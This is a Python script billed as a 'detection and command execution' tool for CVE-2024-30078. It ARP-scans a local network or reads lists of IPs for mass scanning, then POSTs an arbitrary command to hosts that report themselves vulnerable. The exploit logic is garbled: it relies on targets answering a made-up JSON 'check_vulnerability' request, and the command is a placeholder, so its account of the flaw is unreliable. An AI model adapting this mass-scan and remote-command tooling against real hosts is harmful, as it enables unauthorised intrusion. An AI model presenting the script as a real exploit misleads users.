import requests
import json
import argparse
from scapy.all import ARP, Ether, srp

# Define the endpoint and command to be executed
endpoint = "/check"  # Replace with the actual endpoint
command = "your_command_here"  # Replace with the actual command to be executed

# Function to check vulnerability and execute command
def check_vulnerability_and_execute(ip, port, endpoint, command):
    # Construct the URL and payload for the vulnerability check
    url = f"http://{ip}:{port}{endpoint}"
    payload = {
        "command": "check_vulnerability",
        "cve": "CVE-2024-30078"
    }

    # Send the request and receive the response
    response = requests.post(url, json=payload)

    # Check if the response indicates vulnerability
    if response.status_code == 200 and response.json().get("vulnerable"):
        print(f"Vulnerability detected on {ip}:{port}")

        # Construct the payload for command execution
        payload_command = {
            "command": command
        }

        # Send the request to execute the command
        requests.post(url, json=payload_command)
    else:
        print(f"No vulnerability detected on {ip}:{port}")

# Function to get the list of active hosts on the local network
def get_active_hosts(network_range):
    # Create an ARP request packet
    arp = ARP(pdst=network_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Send the packet and receive the response
    result = srp(packet, timeout=2, verbose=False)[0]

    # Parse the response to get the list of active hosts
    hosts = [{"host": received.psrc, "port": 80} for sent, received in result]
    return hosts

def main():
    # Set up argument parsing
    parser = argparse.ArgumentParser(description='CVE-2024-30078 Detection and Command Execution')
    parser.add_argument('-t', '--target', type=str, help='Single target IP address')
    parser.add_argument('-l', '--list', type=str, help='File with a list of IP addresses')
    args = parser.parse_args()

    targets = []

    if args.target:
        # Single scan mode
        targets.append({"host": args.target, "port": 80})
    elif args.list:
        # Mass scan mode
        with open(args.list, 'r') as file:
            for line in file:
                ip = line.strip()
                if ip:
                    targets.append({"host": ip, "port": 80})
    else:
        # If no target or list is provided, scan the local network
        network_range = "192.168.1.0/24"  # Modify this to match your network range
        targets = get_active_hosts(network_range)

    # Iterate over each target and check for the vulnerability
    for target in targets:
        ip = target["host"]
        port = target["port"]
        check_vulnerability_and_execute(ip, port, endpoint, command)

if __name__ == '__main__':
    main()
